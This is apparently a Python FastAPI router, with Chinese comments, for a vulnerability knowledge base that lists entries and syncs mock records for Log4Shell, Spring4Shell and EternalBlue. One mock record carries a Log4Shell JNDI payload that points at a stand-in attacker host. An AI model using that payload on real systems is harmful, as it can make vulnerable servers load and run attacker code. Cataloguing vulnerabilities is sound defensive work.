"""
漏洞知识库 API 路由

提供漏洞知识库管理功能，支持从外部数据源同步漏洞信息。
支持 Seebug 和 Exploit-DB 等数据源。

主要功能：
- 漏洞知识库列表查询
- 漏洞详情查询
- 从外部数据源同步漏洞信息
- 支持关键词搜索和过滤
"""
from fastapi import APIRouter, HTTPException, Query, BackgroundTasks
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from models import VulnerabilityKB
from tortoise.expressions import Q
import logging
import asyncio

router = APIRouter()
logger = logging.getLogger(__name__)

class VulnerabilityKBResponse(BaseModel):
    """
    漏洞知识库响应模型
    
    Attributes:
        id: 漏洞 ID
        cve_id: CVE 编号
        name: 漏洞名称
        description: 漏洞描述
        severity: 严重程度
        cvss_score: CVSS 评分
        affected_product: 受影响产品
        solution: 解决方案
        has_poc: 是否有 POC
        source: 数据源
        created_at: 创建时间
    """
    id: int
    cve_id: Optional[str]
    name: str
    description: Optional[str]
    severity: Optional[str]
    cvss_score: Optional[float]
    affected_product: Optional[str]
    solution: Optional[str]
    has_poc: bool
    source: str
    created_at: str

    class Config:
        from_attributes = True

class SyncResponse(BaseModel):
    """
    同步响应模型
    
    Attributes:
        message: 同步消息
        count: 同步的漏洞数量
    """
    message: str
    count: int

@router.get("/vulnerabilities", response_model=Dict[str, Any])
async def list_kb_vulnerabilities(
    page: int = 1,
    page_size: int = 10,
    keyword: Optional[str] = None,
    source: Optional[str] = None,
    has_poc: Optional[bool] = None
):
    """
    获取漏洞知识库列表
    
    支持按关键词、数据源、是否有 POC 等条件过滤，以及分页查询。
    
    Args:
        page: 页码，从 1 开始
        page_size: 每页数量
        keyword: 搜索关键词，匹配名称、CVE ID 或描述
        source: 数据源过滤，如 'seebug', 'exploit-db'
        has_poc: 是否有 POC，true/false
        
    Returns:
        Dict: 包含漏洞列表和分页信息的响应，结构如下:
            {
                "total": 总数,
                "page": 当前页,
                "page_size": 每页数量,
                "items": [...]
            }
        
    Examples:
        >>> 搜索 SQL 注入相关漏洞
        >>> GET /kb/vulnerabilities?keyword=SQL%20Injection
    """
    query = VulnerabilityKB.all()
    
    if keyword:
        query = query.filter(Q(name__icontains=keyword) | Q(cve_id__icontains=keyword) | Q(description__icontains=keyword))
    
    if source:
        query = query.filter(source=source)
        
    if has_poc is not None:
        query = query.filter(has_poc=has_poc)
        
    total = await query.count()
    items = await query.offset((page - 1) * page_size).limit(page_size).order_by("-updated_at")
    
    # 格式化日期
    formatted_items = []
    for item in items:
        item_dict = dict(item)
        item_dict['created_at'] = item.created_at.strftime("%Y-%m-%d %H:%M:%S")
        item_dict['updated_at'] = item.updated_at.strftime("%Y-%m-%d %H:%M:%S")
        formatted_items.append(item_dict)
        
    return {
        "total": total,
        "page": page,
        "page_size": page_size,
        "items": formatted_items
    }

@router.get("/vulnerabilities/{kb_id}", response_model=Dict[str, Any])
async def get_kb_vulnerability(kb_id: int):
    """
    获取漏洞知识库详情
    
    根据漏洞 ID 获取详细的漏洞信息。
    
    Args:
        kb_id: 漏洞知识库 ID
        
    Returns:
        Dict: 包含漏洞详细信息的响应
        
    Raises:
        HTTPException: 当漏洞不存在时抛出 404 错误
        
    Examples:
        >>> 获取漏洞详情
        >>> GET /kb/vulnerabilities/1
    """
    item = await VulnerabilityKB.get_or_none(id=kb_id)
    if not item:
        raise HTTPException(status_code=404, detail="Vulnerability not found")
    
    item_dict = dict(item)
    item_dict['created_at'] = item.created_at.strftime("%Y-%m-%d %H:%M:%S")
    item_dict['updated_at'] = item.updated_at.strftime("%Y-%m-%d %H:%M:%S")
    
    return item_dict

# TODO: 实际生产环境中，这里应该调用 Seebug API 或爬取数据
async def fetch_seebug_data():
    """
    从 Seebug 获取漏洞数据
    
    模拟从 Seebug 平台获取漏洞信息。
    在实际生产环境中，这里应该调用 Seebug API 或爬取数据。
    
    Returns:
        List[Dict]: 漏洞数据列表
    """
    # 在实际生产环境中，这里应该调用 Seebug API 或爬取数据
    # import requests
    # resp = requests.get("https://www.seebug.org/api/...")
    await asyncio.sleep(1) # 模拟网络延迟
    return [
        {
            "cve_id": "CVE-2021-44228",
            "name": "Apache Log4j2 Remote Code Execution Vulnerability",
            "description": "Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
            "severity": "Critical",
            "cvss_score": 10.0,
            "affected_product": "Apache Log4j2 <= 2.14.1",
            "solution": "Upgrade to Log4j 2.15.0 or later.",
            "has_poc": True,
            "source": "seebug",
            "poc_code": "payload=${jndi:ldap://attacker.com/a}"
        },
        {
            "cve_id": "CVE-2022-22965",
            "name": "Spring Framework RCE via Data Binding on JDK 9+",
            "description": "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding.",
            "severity": "Critical",
            "cvss_score": 9.8,
            "affected_product": "Spring Framework < 5.3.18",
            "solution": "Upgrade to Spring Framework 5.3.18+ or 5.2.20+.",
            "has_poc": True,
            "source": "seebug",
            "poc_code": "# Spring4Shell POC Placeholder"
        }
    ]

# TODO: 实际生产环境中，这里应该调用 Exploit-DB API 或爬取数据
async def fetch_exploit_db_data():
    """
    从 Exploit-DB 获取漏洞数据
    
    模拟从 Exploit-DB 平台获取漏洞信息。
    
    Returns:
        List[Dict]: 漏洞数据列表
    """
    await asyncio.sleep(1)
    return [
        {
            "cve_id": "CVE-2017-0144",
            "name": "EternalBlue (MS17-010)",
            "description": "Remote Code Execution vulnerability in Microsoft SMBv1 server.",
            "severity": "High",
            "cvss_score": 9.3,
            "affected_product": "Windows 7, Windows Server 2008, etc.",
            "solution": "Apply Microsoft MS17-010 patch.",
            "has_poc": True,
            "source": "exploit-db"
        }
    ]

async def sync_vulnerabilities_task():
    """
    后台同步漏洞数据任务
    
    从 Seebug 和 Exploit-DB 等数据源同步漏洞信息到本地数据库。
    该任务在后台异步执行，不阻塞主线程。
    """
    logger.info("开始同步漏洞知识库...")
    
    count = 0
    
    try:
        # 1. 从 Seebug 同步
        seebug_data = await fetch_seebug_data()
        # DEBUG: 打印原始 Seebug 数据
        print(f"原始 Seebug 数据: {seebug_data}")
        for data in seebug_data:
            exists = await VulnerabilityKB.get_or_none(cve_id=data['cve_id'])
            if not exists:
                await VulnerabilityKB.create(**data)
                count += 1
            else:
                # 更新现有记录（可选）
                # exists.update_from_dict(data)
                # await exists.save()
                pass

        # 2. 从 Exploit-DB 同步
        edb_data = await fetch_exploit_db_data()
        for data in edb_data:
            # 通过 CVE 或名称检查
            exists = await VulnerabilityKB.get_or_none(cve_id=data['cve_id'])
            if not exists:
                await VulnerabilityKB.create(**data)
                count += 1
                
    except Exception as e:
        logger.error(f"同步漏洞知识库失败: {e}")
            
    logger.info(f"同步完成，新增 {count} 条漏洞信息")

@router.post("/sync")
async def sync_vulnerabilities(background_tasks: BackgroundTasks):
    """
    触发漏洞库同步
    
    在后台启动漏洞数据同步任务。
    
    Args:
        background_tasks: FastAPI 后台任务管理器
        
    Returns:
        Dict: 同步任务启动响应，结构如下:
            {
                "message": "Sync task started",
                "status": "running"
            }
        
    Examples:
        >>> 触发同步
        >>> POST /kb/sync
    """
    background_tasks.add_task(sync_vulnerabilities_task)
    return {"message": "Sync task started", "status": "running"}
